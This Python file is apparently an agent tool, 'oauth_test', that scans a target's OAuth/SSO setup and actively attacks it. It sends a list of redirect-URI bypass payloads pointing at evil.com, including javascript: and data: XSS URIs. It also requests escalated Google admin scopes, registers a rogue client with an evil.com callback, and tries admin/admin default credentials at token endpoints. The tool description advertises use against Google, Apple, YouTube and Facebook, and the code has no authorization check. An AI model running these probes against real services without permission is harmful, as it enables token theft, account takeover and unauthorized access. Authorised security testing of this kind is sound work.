"""
OAuth/SSO vulnerability tester — redirect URI manipulation, token leakage,
state parameter bypass, scope escalation, PKCE bypass, open redirect chains.
Critical for Google, Apple, YouTube, Facebook OAuth flows.
"""

import requests
import time
import re
import json
import hashlib
from urllib.parse import urlparse, urlencode, parse_qs, quote, urljoin

from tools.target_reachability import (
    format_fallback_notice,
    format_unreachable_error,
    resolve_web_target,
)

HDR = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

# Well-known OAuth/OIDC discovery endpoints
OIDC_DISCOVERY = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/.well-known/openid-configuration/",
    "/oauth/.well-known/openid-configuration",
    "/auth/.well-known/openid-configuration",
    "/realms/master/.well-known/openid-configuration",  # Keycloak
    "/.well-known/jwks.json",
    "/oauth/discovery/keys",
]

# Common OAuth/auth endpoints
AUTH_ENDPOINTS = [
    "/oauth/authorize", "/oauth2/authorize", "/oauth/auth",
    "/authorize", "/auth/authorize", "/login/oauth/authorize",
    "/oauth/token", "/oauth2/token", "/token",
    "/oauth/callback", "/oauth2/callback", "/callback",
    "/auth/login", "/login", "/signin", "/sso/login",
    "/auth/register", "/register", "/signup",
    "/auth/forgot", "/forgot-password", "/reset-password",
    "/auth/verify", "/verify-email", "/confirm",
    "/api/auth/session", "/api/auth/providers",
    "/api/auth/csrf", "/api/auth/signin",
    "/.auth/login", "/.auth/me",  # Azure App Service
    "/saml/SSO", "/saml/login", "/saml2/SSO",  # SAML
    "/cas/login", "/cas/validate",  # CAS
    "/adfs/ls/", "/adfs/oauth2/authorize",  # ADFS
]

# Redirect URI manipulation payloads
REDIRECT_BYPASSES = [
    # Open redirect via subdomain
    "https://evil.com",
    "https://evil.com@{domain}",
    "https://{domain}.evil.com",
    "https://{domain}@evil.com",
    # Path traversal
    "https://{domain}/callback/../evil",
    "https://{domain}/..%2fevil",
    "https://{domain}%2f%2fevil.com",
    # Fragment / parameter tricks
    "https://{domain}/callback#@evil.com",
    "https://{domain}/callback?next=https://evil.com",
    "https://{domain}/callback%23@evil.com",
    # Unicode / encoding tricks
    "https://{domain}/callback/..%252f..%252f",
    "https://evil.com%00.{domain}",
    "https://evil.com%5c.{domain}",
    "https://evil.com%09.{domain}",
    # Localhost / IP tricks
    "http://localhost/callback",
    "http://127.0.0.1/callback",
    "http://0.0.0.0/callback",
    # JavaScript URI (for implicit flow)
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    # Wildcard / regex bypass
    "https://{domain}evil.com",
    "https://not{domain}",
]


def _discover_oauth_config(base):
    """Discover OAuth/OIDC configuration."""
    config = {"endpoints": {}, "oidc_config": None, "jwks": None, "auth_endpoints": []}

    # Try OIDC discovery
    for path in OIDC_DISCOVERY:
        try:
            r = requests.get(f"{base}{path}", headers=HDR, timeout=8, verify=False)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "issuer" in data or "authorization_endpoint" in data or "keys" in data:
                        if "keys" in data:
                            config["jwks"] = data
                        else:
                            config["oidc_config"] = data
                            config["endpoints"] = {
                                "authorization": data.get("authorization_endpoint", ""),
                                "token": data.get("token_endpoint", ""),
                                "userinfo": data.get("userinfo_endpoint", ""),
                                "jwks_uri": data.get("jwks_uri", ""),
                                "revocation": data.get("revocation_endpoint", ""),
                                "introspection": data.get("introspection_endpoint", ""),
                                "registration": data.get("registration_endpoint", ""),
                            }
                except Exception:
                    pass
        except Exception:
            pass

    # Try common auth endpoints
    for path in AUTH_ENDPOINTS:
        try:
            r = requests.get(f"{base}{path}", headers=HDR, timeout=5, verify=False, allow_redirects=False)
            if r.status_code in (200, 301, 302, 303, 401, 403):
                config["auth_endpoints"].append({
                    "path": path,
                    "status": r.status_code,
                    "redirect": r.headers.get("Location", ""),
                })
        except Exception:
            pass

    return config


def _test_redirect_uri(auth_url, domain, client_id="test"):
    """Test redirect_uri validation bypasses."""
    findings = []
    if not auth_url:
        return findings

    for bypass_template in REDIRECT_BYPASSES:
        bypass = bypass_template.replace("{domain}", domain)
        params = {
            "client_id": client_id,
            "redirect_uri": bypass,
            "response_type": "code",
            "scope": "openid",
            "state": "test123",
        }
        try:
            r = requests.get(auth_url, params=params, headers=HDR, timeout=8,
                           verify=False, allow_redirects=False)

            # Check if redirect_uri was accepted (redirect to our URL)
            location = r.headers.get("Location", "")

            if r.status_code in (301, 302, 303, 307, 308):
                # Check if it redirected to our evil URI
                if "evil.com" in location or "localhost" in location or "127.0.0.1" in location:
                    findings.append({
                        "type": "redirect_uri_bypass",
                        "severity": "CRITICAL",
                        "payload": bypass,
                        "redirect": location[:200],
                        "desc": f"Redirect URI validation bypassed: {bypass}",
                        "cwe": "CWE-601",
                    })
                # Check if code/token is in the redirect (implicit flow leak)
                if "code=" in location or "access_token=" in location or "token=" in location:
                    findings.append({
                        "type": "token_in_redirect",
                        "severity": "HIGH",
                        "redirect": location[:200],
                        "desc": "Token/code present in redirect URL — token leakage risk",
                    })

            # If not redirected but also not a clear error, the URI may be accepted
            if r.status_code == 200 and "error" not in r.text[:500].lower():
                if "evil.com" in bypass:
                    findings.append({
                        "type": "redirect_uri_accepted",
                        "severity": "MEDIUM",
                        "payload": bypass,
                        "desc": f"Redirect URI accepted without error: {bypass}",
                    })
        except Exception:
            pass

    return findings


def _test_state_parameter(auth_url, domain):
    """Test state parameter validation."""
    findings = []
    if not auth_url:
        return findings

    # Test without state parameter
    params = {
        "client_id": "test",
        "redirect_uri": f"https://{domain}/callback",
        "response_type": "code",
        "scope": "openid",
    }
    try:
        r = requests.get(auth_url, params=params, headers=HDR, timeout=8,
                       verify=False, allow_redirects=False)
        if r.status_code in (200, 302) and "error" not in str(r.text[:300]).lower():
            findings.append({
                "type": "missing_state",
                "severity": "MEDIUM",
                "desc": "OAuth flow works without state parameter — CSRF possible",
                "cwe": "CWE-352",
            })
    except Exception:
        pass

    return findings


def _test_scope_escalation(token_url):
    """Test if scope can be escalated."""
    findings = []
    if not token_url:
        return findings

    # Try requesting elevated scopes
    elevated_scopes = [
        "openid profile email admin",
        "openid profile email write",
        "openid profile email user.admin",
        "openid profile email https://www.googleapis.com/auth/admin.directory.user",
        "openid profile email https://www.googleapis.com/auth/cloud-platform",
    ]

    for scope in elevated_scopes:
        try:
            r = requests.post(token_url, data={
                "grant_type": "client_credentials",
                "scope": scope,
            }, headers=HDR, timeout=5, verify=False)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "access_token" in data:
                        granted_scope = data.get("scope", "")
                        findings.append({
                            "type": "scope_escalation",
                            "severity": "HIGH",
                            "requested_scope": scope,
                            "granted_scope": granted_scope,
                            "desc": f"Token issued with elevated scope: {granted_scope or scope}",
                            "cwe": "CWE-269",
                        })
                except Exception:
                    pass
        except Exception:
            pass

    return findings


def _test_jwks_vulnerabilities(jwks_uri, jwks_data=None):
    """Test JWKS/JWT vulnerabilities."""
    findings = []

    # Fetch JWKS if not provided
    if not jwks_data and jwks_uri:
        try:
            r = requests.get(jwks_uri, headers=HDR, timeout=8, verify=False)
            if r.status_code == 200:
                jwks_data = r.json()
        except Exception:
            pass

    if not jwks_data:
        return findings

    keys = jwks_data.get("keys", [])
    if keys:
        findings.append({
            "type": "jwks_exposed",
            "severity": "INFO",
            "desc": f"JWKS endpoint exposes {len(keys)} signing keys",
            "key_types": [k.get("kty", "") for k in keys],
        })

        # Check for weak keys
        for key in keys:
            kty = key.get("kty", "")
            if kty == "RSA":
                # Check key size (n parameter length)
                n = key.get("n", "")
                if n and len(n) < 300:  # Rough check for < 2048-bit
                    findings.append({
                        "type": "weak_rsa_key",
                        "severity": "HIGH",
                        "desc": f"Weak RSA key detected (kid: {key.get('kid', 'unknown')})",
                        "cwe": "CWE-326",
                    })
            if key.get("alg") == "none" or not key.get("alg"):
                findings.append({
                    "type": "no_alg_restriction",
                    "severity": "HIGH",
                    "desc": "Key has no algorithm restriction — 'none' algorithm attack possible",
                    "cwe": "CWE-327",
                })

    return findings


def _test_registration_endpoint(reg_url):
    """Test dynamic client registration."""
    findings = []
    if not reg_url:
        return findings

    try:
        payload = {
            "redirect_uris": ["https://evil.com/callback"],
            "client_name": "Security Test",
            "grant_types": ["authorization_code"],
            "response_types": ["code"],
        }
        r = requests.post(reg_url, json=payload, headers={**HDR, "Content-Type": "application/json"},
                        timeout=10, verify=False)
        if r.status_code in (200, 201):
            try:
                data = r.json()
                if "client_id" in data:
                    findings.append({
                        "type": "open_registration",
                        "severity": "HIGH",
                        "desc": f"Dynamic client registration is open! Got client_id: {data.get('client_id', '')}",
                        "client_id": data.get("client_id", ""),
                        "cwe": "CWE-287",
                    })
            except Exception:
                pass
    except Exception:
        pass

    return findings


def oauth_test(target, stream_callback=None):
    """
    Comprehensive OAuth/SSO vulnerability testing.
    """
    def _emit(msg):
        if stream_callback:
            stream_callback("oauth_progress", {"message": msg})

    _emit("🌐 Resolving reachable target URL...")
    resolution = resolve_web_target(target, headers=HDR)
    if not resolution.get("ok"):
        _emit("  ❌ Target unreachable across allowed URL variants")
        return format_unreachable_error(target, resolution)

    base = (resolution.get("selected_url") or resolution.get("normalized_url") or target).rstrip("/")
    fallback_note = format_fallback_notice(resolution)
    if fallback_note:
        _emit("  ↪ %s" % fallback_note)

    domain = urlparse(base).netloc

    _emit(f"🎯 OAuth/SSO Vulnerability Testing: {base}")
    start = time.time()
    all_findings = []

    # Phase 1: Discover OAuth configuration
    _emit("🔍 Phase 1: Discovering OAuth/OIDC configuration...")
    config = _discover_oauth_config(base)

    if config["oidc_config"]:
        _emit(f"  ✅ OIDC configuration found!")
        _emit(f"  Issuer: {config['oidc_config'].get('issuer', 'N/A')}")
        for k, v in config["endpoints"].items():
            if v:
                _emit(f"  {k}: {v}")

        all_findings.append({
            "type": "oidc_exposed",
            "severity": "INFO",
            "desc": "OIDC discovery endpoint exposes full OAuth configuration",
            "config": {k: v for k, v in config["endpoints"].items() if v},
        })

    if config["auth_endpoints"]:
        _emit(f"  Found {len(config['auth_endpoints'])} auth endpoints")
        for ep in config["auth_endpoints"][:10]:
            _emit(f"  [{ep['status']}] {ep['path']}")

    auth_url = config["endpoints"].get("authorization", "")
    token_url = config["endpoints"].get("token", "")
    jwks_uri = config["endpoints"].get("jwks_uri", "")
    reg_url = config["endpoints"].get("registration", "")

    # If no OIDC config, try to find auth URL from endpoints
    if not auth_url:
        for ep in config["auth_endpoints"]:
            if "authorize" in ep["path"] and ep["status"] in (200, 302):
                auth_url = f"{base}{ep['path']}"
                break

    # Phase 2: Redirect URI manipulation
    _emit("🔨 Phase 2: Testing redirect URI validation...")
    if auth_url:
        redirect_findings = _test_redirect_uri(auth_url, domain)
        for f in redirect_findings:
            _emit(f"  {'🔴' if f['severity'] == 'CRITICAL' else '🟡'} {f['desc']}")
        all_findings.extend(redirect_findings)
    else:
        _emit("  No authorization endpoint found — skipping redirect URI tests")

    # Phase 3: State parameter
    _emit("🔨 Phase 3: Testing state parameter validation...")
    state_findings = _test_state_parameter(auth_url, domain)
    for f in state_findings:
        _emit(f"  🟡 {f['desc']}")
    all_findings.extend(state_findings)

    # Phase 4: Scope escalation
    _emit("🔨 Phase 4: Testing scope escalation...")
    scope_findings = _test_scope_escalation(token_url)
    for f in scope_findings:
        _emit(f"  🔴 {f['desc']}")
    all_findings.extend(scope_findings)

    # Phase 5: JWKS/JWT vulnerabilities
    _emit("🔨 Phase 5: Testing JWKS/JWT vulnerabilities...")
    jwt_findings = _test_jwks_vulnerabilities(jwks_uri, config.get("jwks"))
    for f in jwt_findings:
        _emit(f"  {'🔴' if f['severity'] == 'HIGH' else 'ℹ️'} {f['desc']}")
    all_findings.extend(jwt_findings)

    # Phase 6: Dynamic client registration
    _emit("🔨 Phase 6: Testing dynamic client registration...")
    reg_findings = _test_registration_endpoint(reg_url)
    for f in reg_findings:
        _emit(f"  🔴 {f['desc']}")
    all_findings.extend(reg_findings)

    # Phase 7: Token endpoint abuse
    _emit("🔨 Phase 7: Testing token endpoint...")
    if token_url:
        # Test various grant types
        for grant in ["client_credentials", "password", "authorization_code"]:
            try:
                r = requests.post(token_url, data={
                    "grant_type": grant,
                    "username": "admin", "password": "admin",
                    "client_id": "test", "client_secret": "test",
                }, headers=HDR, timeout=5, verify=False)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if "access_token" in data:
                            all_findings.append({
                                "type": "token_with_default_creds",
                                "severity": "CRITICAL",
                                "desc": f"Token issued with grant_type={grant} and default credentials!",
                                "cwe": "CWE-798",
                            })
                            _emit(f"  🔴 Token issued with {grant} + default creds!")
                    except Exception:
                        pass
            except Exception:
                pass

    elapsed = time.time() - start

    # Format output
    lines = [
        f"OAUTH/SSO VULNERABILITY SCAN for {base}",
        f"{'='*60}",
        f"Findings: {len(all_findings)} | Time: {elapsed:.1f}s\n",
    ]
    if fallback_note:
        lines = [fallback_note, ""] + lines

    if config["oidc_config"]:
        lines.append("📋 OAUTH CONFIGURATION")
        lines.append("-" * 40)
        for k, v in config["endpoints"].items():
            if v:
                lines.append(f"  {k}: {v}")
        lines.append("")

    if config["auth_endpoints"]:
        lines.append(f"📋 AUTH ENDPOINTS ({len(config['auth_endpoints'])})")
        lines.append("-" * 40)
        for ep in config["auth_endpoints"]:
            lines.append(f"  [{ep['status']}] {ep['path']}")
        lines.append("")

    # Group findings by severity
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "INFO"]:
        group = [f for f in all_findings if f["severity"] == sev]
        if group:
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "INFO": "ℹ️"}[sev]
            lines.append(f"{icon} {sev} ({len(group)})")
            lines.append("-" * 40)
            for f in group:
                lines.append(f"  [{f['type']}] {f['desc']}")
                if f.get("cwe"):
                    lines.append(f"  CWE: {f['cwe']}")
                if f.get("payload"):
                    lines.append(f"  Payload: {f['payload']}")
                if f.get("redirect"):
                    lines.append(f"  Redirect: {f['redirect']}")
                lines.append("")

    if not all_findings:
        lines.append("No OAuth/SSO vulnerabilities found.")

    return "\n".join(lines)


TOOL_DEFINITION = {
    "type": "function",
    "function": {
        "name": "oauth_test",
        "description": "Comprehensive OAuth/SSO vulnerability tester. Discovers OIDC configuration, tests redirect URI manipulation (15+ bypass techniques), state parameter CSRF, scope escalation, JWKS/JWT weaknesses (none algorithm, weak keys), dynamic client registration abuse, and token endpoint with default credentials. Works against Google, Apple, YouTube, Facebook, Keycloak, Auth0, Okta OAuth flows.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to test OAuth/SSO"
                }
            },
            "required": ["target"]
        }
    }
}
